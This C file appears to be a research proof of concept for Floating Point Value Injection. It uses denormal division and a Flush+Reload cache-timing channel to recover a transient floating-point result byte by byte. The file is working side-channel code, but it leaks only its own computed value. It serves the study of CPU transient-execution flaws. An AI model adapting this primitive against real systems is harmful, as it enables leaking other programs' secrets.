#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>
#include <x86intrin.h>

#include "asm.h"

#define NUM_SAMPLES 1000
#define STRIDE 4096
#define ITERATIONS 20
#define ROUNDS 10

uint64_t measure_access(unsigned char* addr, int is_miss) {
    uint64_t min_time = UINT64_MAX;
    
    for(int i = 0; i < ROUNDS; i++) {
        if(is_miss) {
            clflush(addr);
        } else {
            *(volatile char*)addr; 
        }
        mfence();
        
        uint64_t start = rdtscp();
        *(volatile char*)addr;
        lfence();
        uint64_t end = rdtscp();
        
        uint64_t delta_t = end - start;
        if(delta_t < min_time) {
            min_time = delta_t;
        }
    }
    
    return min_time;
}

uint64_t get_cache_threshold(){
    uint64_t hits = 0;    
    uint64_t misses = 0;   
    uint64_t delta_t;

    unsigned char test_line[64];
    test_line[0] = 1;

    *(volatile char*)test_line;
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t = measure_access(test_line, 0);
        hits += delta_t;
    }

    clflush(test_line);
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t = measure_access(test_line, 1);
        misses += delta_t;
    }

    uint64_t hit_avg = hits / NUM_SAMPLES;
    uint64_t miss_avg = misses / NUM_SAMPLES;
    uint64_t threshold = (miss_avg + hit_avg) / 2;
 
    return threshold;
}

void reload_and_measure(unsigned char *reloadbuffer, size_t *cache_hits, uint64_t threshold) {
    for(int j = 0; j < 256; j++) {  
        mfence();
        uint64_t start = rdtscp();
        *(volatile char*)(&reloadbuffer[j * STRIDE]);
        lfence();
        uint64_t end = rdtscp();
        
        uint64_t reload_time = end - start;
        if(reload_time < threshold) {
            cache_hits[j]++;
        }
    }
}

uint64_t make_denormal() {
    uint64_t rand_val;
    asm volatile("rdrand %%rax" : "=a"(rand_val));
    rand_val &= 0x000FFFFFFFFFFFFFULL;

    return rand_val;
}

int main(int argc, char *argv[]) {
    uint64_t CACHE_THRESHOLD = get_cache_threshold();
    int RELOADBUFFER_SIZE = 256 * STRIDE;  

    unsigned char *reloadbuffer = mmap(NULL, RELOADBUFFER_SIZE, PROT_READ | PROT_WRITE,
                                      MAP_ANONYMOUS |MAP_HUGETLB | MAP_PRIVATE | MAP_POPULATE, -1, 0);
    memset(reloadbuffer, 0, RELOADBUFFER_SIZE);
    
    printf("CACHE THRESHOLD = %lu cycles\n\n", CACHE_THRESHOLD);

    uint64_t dx = make_denormal();
    uint64_t dy = make_denormal();

    printf("dx = 0x%016lx\n", dx);
    printf("dy = 0x%016lx\n", dy);
    
    // get architectural result
    double result = (*(double*)&dx) / (*(double*)&dy);
    uint64_t architectural_result = *(uint64_t*)&result;

    printf("architectural result = 0x%016lx\n\n", architectural_result);
    
    // Recover transient result byte by byte
    uint64_t transient_result = 0;
    
    for (int byte_index = 0; byte_index < 8; byte_index++) {  
        size_t cache_hits[256] __attribute__((aligned(4096))) = {0};  
        for (int i = 0; i < ITERATIONS; i++) {
            // 1. Flush
            for (int j = 0; j < 256; j++) { 
                clflush(&reloadbuffer[j * STRIDE]);
            }
            mfence();

            // 2. FPVI 
            asm volatile(
                ".rept 2                   \n\t" 
                "  movq  %[x], %%xmm0       \n\t"  
                "  movq  %[y], %%xmm1       \n\t"  
                "  divsd %%xmm1, %%xmm0     \n\t"
                ".endr                      \n\t"
                "movq %%xmm0, %%rax         \n\t"
                "mov  %[shift], %%ecx       \n\t"
                "shrq %%cl, %%rax           \n\t"
                "and  $0xff, %%rax          \n\t"  // 8 bits for byte 
                "shl  $12, %%rax            \n\t"  // STRIDE shift to calculate cache offset
                "add  %[buf], %%rax         \n\t"
                "movb (%%rax), %%al         \n\t"  // access to bring into cache
                :
                : [x]"m"(dx),
                  [y]"m"(dy),
                  [buf]"r"(reloadbuffer),
                  [shift]"r"(byte_index * 8)        
                : "rax","rcx","xmm0","xmm1","memory"
            );
   
            // 3. Reload and measure
            reload_and_measure(reloadbuffer, cache_hits, CACHE_THRESHOLD);
        }

        // extract the 8-bit architectural byte with index byte_index
        uint8_t architectural_byte = (architectural_result >> (byte_index * 8)) & 0xff;
        uint8_t transient_byte = architectural_byte;
        
        // get the most hit that is not the architectural one 
        for(int j = 0; j < 256; j++) {
            if(cache_hits[j] > 5 && j != architectural_byte) {
                transient_byte = j;
                break;
            }
        }
        
        // to reconstruct the transient result
        transient_result |= ((uint64_t)transient_byte) << (byte_index * 8);
        
        printf("Byte %d:    0x%02x (hits=%zu)\n", byte_index, transient_byte, cache_hits[transient_byte]);
    }
    
    printf("\nTRANSIENT LEAKED RESULT: 0x%016lx\n", transient_result);

    munmap(reloadbuffer, RELOADBUFFER_SIZE);
    return 0;
}
